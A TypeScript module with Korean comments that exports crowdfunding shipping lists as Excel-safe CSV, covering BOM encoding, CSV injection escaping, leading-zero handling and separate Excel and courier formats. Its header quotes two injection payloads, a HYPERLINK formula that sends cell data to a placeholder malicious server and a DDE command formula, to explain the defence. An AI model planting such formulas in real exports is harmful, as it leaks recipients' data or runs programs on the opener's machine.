/**
 * 배송 목록 내보내기 — **순수 함수만.** DB·요청·응답을 모르는 자리다.
 *
 * 만드는 것은 CSV 한 장이고, 그 한 장이 **윈도우 엑셀에서 열린다**는 것이
 * 이 파일에 있는 거의 모든 처리의 이유다.
 *
 * ## ① 한글이 깨진다 — BOM과 CRLF
 *
 * 윈도우 엑셀은 확장자가 `.csv`인 파일을 열 때 인코딩을 묻지 않고 시스템
 * 기본 코드페이지(한국어 윈도우는 cp949)로 읽는다. UTF-8로 쓴 '서울시'는
 * 그대로 '���'이 된다. 파일 맨 앞에 **UTF-8 BOM(`﻿`)**을 붙이면 엑셀이
 * 그 표식을 보고 UTF-8로 읽는다. 줄바꿈도 `\r\n`으로 쓴다 — `\n`만 쓰면
 * 구형 엑셀이 한 줄로 이어 붙인다.
 *
 * ## ② 남이 적은 글자가 수식이 된다 — CSV 인젝션
 *
 * 배송 메모·주소·이름은 **낯선 사람이 입력창에 적은 값**이다. 엑셀은 셀이
 * `=`, `+`, `-`, `@`, 탭, 캐리지리턴으로 시작하면 그것을 수식으로 해석한다.
 * `=HYPERLINK("http://악성/"&A1,"클릭")` 한 줄이면 옆 칸의 주소가 남의
 * 서버로 넘어가고, `=cmd|'/c calc'!A1`은 DDE로 프로그램을 띄우려 든다.
 * 열어 보는 사람은 개설자와 사무국이다 — 즉 이 파일은 **후원자가 개설자의
 * 엑셀에 넣는 입력**이다.
 *
 * 그래서 그런 글자로 시작하는 값 앞에 작은따옴표(`'`)를 붙여 수식이 아닌
 * 글자로 만든다(OWASP 권고). 값이 눈에 한 글자 늘어 보이는 것을 감수한다 —
 * 원본을 지우거나 조용히 바꾸는 것보다 낫다.
 *
 * ## ③ 앞의 0이 사라진다 — 우편번호와 전화번호
 *
 * `06236`을 그냥 적으면 엑셀이 숫자로 보고 `6236`으로 만든다. `01012345678`도
 * `1012345678`이 된다. 택배 송장에 그대로 옮기면 **배달이 안 되는 번호**다.
 * 이 두 칸만 엑셀의 문자열 수식(`="06236"`)으로 적는다. 수식을 우리가 만드는
 * 셈이라 ②와 어긋나 보이지만, 그 전에 **숫자와 하이픈만 남기고 전부 버리기**
 * 때문에 후원자가 넣은 글자가 수식 안으로 들어갈 길이 없다.
 *
 * ## ④ 그런데 그 수식이 택배사 양식을 깨뜨린다 — 그래서 판본이 둘이다
 *
 * ③의 `="06236"`은 **엑셀만 아는 문법**이다. 개설자가 같은 파일을 택배사의
 * 대량 접수 양식에 그대로 올리면 전화번호 칸에 `="01012345678"`이라는 **글자
 * 그대로**가 들어가 배달되지 않는 행이 된다 — 하필 그 처리가 지키려던 바로
 * 그 두 칸에서. 한 파일로 둘 다 만족시킬 방법은 없다.
 *
 * 그래서 두 판본을 준다.
 *
 * - `excel` — 엑셀에서 눈으로 보고 손으로 고칠 때. ①②③ 전부 적용.
 * - `courier` — 택배사 양식이나 다른 프로그램에 올릴 때. 우편번호·전화번호를
 *   **값 그대로** 적는다. ①(BOM·CRLF)과 ②(수식 차단)는 그대로 둔다 — 한글은
 *   어느 쪽에서든 깨지면 안 되고, 남이 적은 글자가 수식이 되는 것도 어느
 *   쪽에서든 안 된다.
 *
 * 고르는 사람이 스프레드시트를 생각하지 않아도 되도록, 화면의 두 링크는
 * **하려는 일**로 이름을 단다("엑셀에서 열어 보기" / "택배사 양식에 올리기").
 */

import { FULFILLMENT_LABEL, type FulfillmentStatus } from './fulfillment.ts'

/** 내보내기 판본. 무엇에 쓸 파일인가로 갈린다. */
export const SHIPPING_EXPORT_FORMATS = ['excel', 'courier'] as const

export type ShippingExportFormat = (typeof SHIPPING_EXPORT_FORMATS)[number]

/**
 * 요청의 `format` 값을 판본으로. 모르는 값은 `excel`로 떨어진다 — 링크를
 * 손으로 고쳐 넣은 사람에게 빈 화면 대신 쓸 수 있는 파일을 준다.
 */
export function parseShippingExportFormat(value: unknown): ShippingExportFormat {
  return value === 'courier' ? 'courier' : 'excel'
}

/** 엑셀이 수식으로 읽기 시작하는 첫 글자들. */
const FORMULA_LEADS = ['=', '+', '-', '@', '\t', '\r']

/** 값 하나를 CSV 칸으로. 수식 차단 → 따옴표 이스케이프 순서다. */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return '""'
  let text = String(value)
  if (FORMULA_LEADS.some(lead => text.startsWith(lead))) text = `'${text}`
  return `"${text.replace(/"/g, '""')}"`
}

/**
 * 앞의 0을 지켜야 하는 칸(우편번호·전화번호).
 *
 * 어느 판본이든 **숫자와 하이픈만 남긴다** — 그래서 이 칸으로는 후원자가 적은
 * 글자가 들어갈 수 없고, 아래에서 수식을 만들어도 안전하다.
 *
 * - `excel`: 엑셀 문자열 수식(`="06236"`)으로 감싸 앞의 0을 지킨다.
 * - `courier`: 값 그대로. 택배사 양식은 수식 문법을 모른다.
 */
export function csvDigits(value: unknown, format: ShippingExportFormat = 'excel'): string {
  const digits = String(value ?? '').replace(/[^0-9-]/g, '')
  if (digits.length === 0) return '""'
  if (format === 'courier') return `"${digits}"`
  return `"=""${digits}"""`
}

export const SHIPPING_EXPORT_HEADERS = [
  '후원번호',
  '후원자',
  '받는 사람',
  '연락처',
  '우편번호',
  '주소',
  '상세주소',
  '배송 메모',
  '리워드',
  '수량',
  '이행 상태',
] as const

export interface ShippingRow {
  pledge_code?: unknown
  backer_name?: unknown
  shipping_name?: unknown
  shipping_phone?: unknown
  shipping_postcode?: unknown
  shipping_address1?: unknown
  shipping_address2?: unknown
  shipping_memo?: unknown
  reward_title?: unknown
  quantity?: unknown
  fulfillment_status?: unknown
}

function label(status: unknown): string {
  return FULFILLMENT_LABEL[status as FulfillmentStatus] ?? String(status ?? '')
}

/** 표 한 장. 맨 앞의 BOM과 `\r\n`이 ①의 처리다. */
export function buildShippingCsv(
  rows: ShippingRow[],
  format: ShippingExportFormat = 'excel'
): string {
  const lines = [SHIPPING_EXPORT_HEADERS.map(csvCell).join(',')]
  for (const r of rows) {
    lines.push(
      [
        csvCell(r.pledge_code),
        csvCell(r.backer_name),
        csvCell(r.shipping_name),
        csvDigits(r.shipping_phone, format),
        csvDigits(r.shipping_postcode, format),
        csvCell(r.shipping_address1),
        csvCell(r.shipping_address2),
        csvCell(r.shipping_memo),
        csvCell(r.reward_title),
        csvCell(r.quantity),
        csvCell(label(r.fulfillment_status)),
      ].join(',')
    )
  }
  return `﻿${lines.join('\r\n')}\r\n`
}

/**
 * 내려받을 때 붙는 파일 이름.
 *
 * 한글 파일명은 `filename=`에 그대로 담을 수 없다(헤더는 ASCII다). RFC 5987의
 * `filename*=UTF-8''…`로 한글을 주고, 그 문법을 모르는 오래된 클라이언트를
 * 위해 ASCII 이름을 `filename=`에 함께 남긴다.
 */
export function shippingExportDisposition(
  campaignTitle: unknown,
  today: Date,
  format: ShippingExportFormat = 'excel'
): string {
  const date = today.toISOString().slice(0, 10)
  const safeTitle = String(campaignTitle ?? '')
    // 따옴표·역슬래시·제어문자는 헤더를 깨뜨린다. 경로 구분자도 지운다.
    .replace(/["\\/\r\n\t]/g, ' ')
    .trim()
    .slice(0, 60)
  // 두 판본을 같은 이름으로 주면 내려받기 폴더에서 구분이 안 된다.
  const kind = format === 'courier' ? '택배사용' : '엑셀용'
  const korean = `${safeTitle || '펀딩'}_배송목록_${kind}_${date}.csv`
  const ascii = `funding-shipping-${format}-${date}.csv`
  return `attachment; filename="${ascii}"; filename*=UTF-8''${encodeURIComponent(korean)}`
}
